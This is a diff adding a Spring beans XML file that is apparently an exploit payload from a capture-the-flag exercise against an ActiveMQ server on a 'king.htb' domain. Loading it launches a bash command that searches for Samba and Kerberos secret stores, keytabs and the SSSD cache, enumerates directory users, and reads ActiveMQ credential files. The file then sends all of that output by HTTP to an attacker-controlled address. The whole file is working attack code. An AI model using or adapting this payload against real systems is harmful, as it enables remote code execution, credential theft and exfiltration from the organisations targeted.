@@ -1,0 +1,28 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<beans xmlns="http://www.springframework.org/schema/beans"
+       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+       xsi:schemaLocation="http://www.springframework.org/schema/beans
+       http://www.springframework.org/schema/beans/spring-beans.xsd">
+    <bean id="pb" class="java.lang.ProcessBuilder">
+        <constructor-arg>
+            <list>
+                <value>/bin/bash</value>
+                <value>-c</value>
+                <value><![CDATA[echo "=SAMBA_DB="; find / -name "sam.ldb" -o -name "secrets.ldb" -o -name "*.ldb" 2>/dev/null | grep -v proc | head -20; echo "=KEYTAB="; ls -la /etc/krb5.keytab /etc/*.keytab /var/lib/sss/*.keytab 2>/dev/null; echo "=SSSD_CACHE="; ls -la /var/lib/sss/db/ 2>/dev/null; echo "=KRB5_CONF="; cat /etc/krb5.conf 2>/dev/null; echo "=SAMBA_DC="; find /var/lib/samba -type f 2>/dev/null | head -30; echo "=LDAP_TEST="; ldapsearch -H ldap://localhost -x -b "dc=king,dc=htb" "(objectClass=user)" sAMAccountName 2>/dev/null | head -40; echo "=NET_ADS="; net ads info 2>/dev/null; echo "=WBINFO="; wbinfo -u 2>/dev/null | head -20; echo "=ACTIVEMQ_LOGIN="; cat /opt/activemq/conf/login.config 2>/dev/null; cat /opt/activemq/conf/users.properties 2>/dev/null; echo "=ACTIVE_MQ_CONF2="; ls /opt/activemq/conf/ 2>/dev/null]]></value>
+            </list>
+        </constructor-arg>
+    </bean>
+    <bean id="proc" factory-bean="pb" factory-method="start"/>
+    <bean id="procOut" factory-bean="proc" factory-method="getInputStream"/>
+    <bean id="outBytes" class="org.springframework.util.FileCopyUtils"
+          factory-method="copyToByteArray">
+        <constructor-arg ref="procOut"/>
+    </bean>
+    <bean id="outStr" class="java.lang.String">
+        <constructor-arg ref="outBytes"/>
+    </bean>
+    <bean id="outUrl" class="java.net.URL" depends-on="outStr">
+        <constructor-arg value="#{'http://10.10.14.2:8080/ad?v=' + T(java.net.URLEncoder).encode(@outStr,'UTF-8')}"/>
+    </bean>
+    <bean id="outReq" factory-bean="outUrl" factory-method="openStream" depends-on="outUrl"/>
+</beans>
